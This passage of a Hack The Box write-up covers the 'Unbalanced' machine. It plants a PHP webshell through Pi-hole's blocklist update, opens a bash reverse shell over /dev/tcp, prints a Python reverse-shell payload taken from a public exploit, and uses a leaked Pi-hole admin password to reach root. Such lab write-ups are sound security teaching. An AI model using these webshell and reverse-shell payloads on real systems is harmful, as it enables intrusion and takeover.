Interestingly, it reports that the retrieval from my new blocklist was successful (and all the others fail, which makes sense, as they are on the internet which isn’t routable from the HTB machines).

I’ll click the big blue Update button at the top again, and I get another connection at `nc`. This time the server sent `.domains`. I’ll respond with a PHP webshell:

```

root@kali# nc -lnvp 80
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.200.
Ncat: Connection from 10.10.10.200:40094.
POST / HTTP/1.1
Host: 10.10.14.24
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
Accept: */*
Content-Length: 8
Content-Type: application/x-www-form-urlencoded

.domains
<?php system($_GET['cmd']); ?>

^C

```

The page looks similar to above, but this time it reports that retrieval failed:

![image-20200820162949485](https://0xdfimages.gitlab.io/img/image-20200820162949485.png)

Despite the failure message, there is a webshell at `/admin/scripts/pi-hole/php/0xdf.php`:

```

root@kali# curl http://127.0.0.1:2222/admin/scripts/pi-hole/php/0xdf.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Shell

I can get an interactive shell here using the following:

```

root@kali# curl -s -G http://127.0.0.1:2222/admin/scripts/pi-hole/php/0xdf.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.24/443 0>&1'"

```

At a `nc` listener:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.200.
Ncat: Connection from 10.10.10.200:50598.
bash: cannot set terminal process group (526): Inappropriate ioctl for device
bash: no job control in this shell
www-data@pihole:/var/www/html/admin/scripts/pi-hole/php$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Rabbit Hole

I wasted a lot of time trying to get the other half of the Pi-Hole exploit that goes to root to work. It doesn’t. The next step is to use the same upload steps to append to an existing script, `teleporter.php`. Unfortunately, the file isn’t writable by www-data:

```

www-data@pihole:/var/www/html/admin/scripts/pi-hole/php$ ls -l teleporter.php
-rw-r--r-- 1 root root 6032 Sep 20  2019 teleporter.php

```

I suspect in a typical Pi-Hole this file is writable by www-data.

## Shell as root

### Enumeration

After wasting a ton of time with the above exploit and enumerating and not finding much, I tried to see if there even was a flag in `/root` on the container. I wasn’t expecting to have permissions to see inside `/root`, but I could:

```

www-data@pihole:/root$ ls -l
total 116
-rw-r--r-- 1 root root 113876 Sep 20  2019 ph_install.sh
-rw-r--r-- 1 root root    485 Apr  6 07:28 pihole_config.sh

```

My gut feeling was that the `ph_install.sh` script was the legit installer script:

```

www-data@pihole:/root$ head ph_install.sh
#!/usr/bin/env bash
# shellcheck disable=SC1090

# Pi-hole: A black hole for Internet advertisements
# (c) 2017-2018 Pi-hole, LLC (https://pi-hole.net)
# Network-wide ad blocking via your own hardware.
#
# Installs and Updates Pi-hole
#
# This file is copyright under the latest version of the EUPL.

```

I got the hash of the file:

```

www-data@pihole:/root$ md5sum ph_install.sh
f94d58bc44ebaec8d2650152ac29bbff  ph_install.sh

```

Then I checked Google (and found nothing) and VirusTotal, where I found it:

[![image-20200820180113728](https://0xdfimages.gitlab.io/img/image-20200820180113728.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200820180113728.png)

The name is `basic-install.sh` (which is what the install script is called in [GitHub](https://github.com/pi-hole/pi-hole/blob/master/automated%20install/basic-install.sh).

I moved onto the other file, `pihole_config.sh`, which was referenced in the `TODO` above.

```

#!/bin/bash

# Add domains to whitelist
/usr/local/bin/pihole -w unbalanced.htb
/usr/local/bin/pihole -w rebalanced.htb

# Set temperature unit to Celsius
/usr/local/bin/pihole -a -c

# Add local host record
/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1

# Set privacy level
/usr/local/bin/pihole -a -l 4

# Set web admin interface password
/usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'

# Set admin email
/usr/local/bin/pihole -a email admin@unbalanced.htb

```

Nothing here is too interesting, other than the admin password that will be used someday in the future.

### su

Back in my shell on Unbalanced, I tried `su` to see if this password happened to be used by root, and it does:

```

bryan@unbalanced:~$ su -
Password: 
root@unbalanced:~# id
uid=0(root) gid=0(root) groups=0(root)

```

And now I can grab `root.txt`:

```

root@unbalanced:~# cat root.txt
97208547************************

```

## Beyond Root

When I tried to run the various one of the exploit script from `searchsploit`, “Pi-hole 4.4.0 - Remote Code Execution (Authenticated)”, it didn’t work on Unbalanced. I wanted to take a quick look at why. I commented out the steps to clean up at the end, and ran it. With my shell as www-data, I then went to look at the directory where the webshell should be written. The script was there, and it looked like it should work:

```

www-data@pihole:/var/www/html/admin/scripts/pi-hole/php$ cat aznjimvv.php 
<?php
    shell_exec("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.24\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
    ?>

```

If I remembered from trying to shell upgrade, I’d see the problem. If not, I could see it by running the script:

```

www-data@pihole:/var/www/html/admin/scripts/pi-hole/php$ php aznjimvv.php 
sh: 1: python3: not found

```

Python3 isn’t installed. Neither is Python. So the PHP webshell works, but the Python reverse shell one liner that it tries to `shell_exec` fails.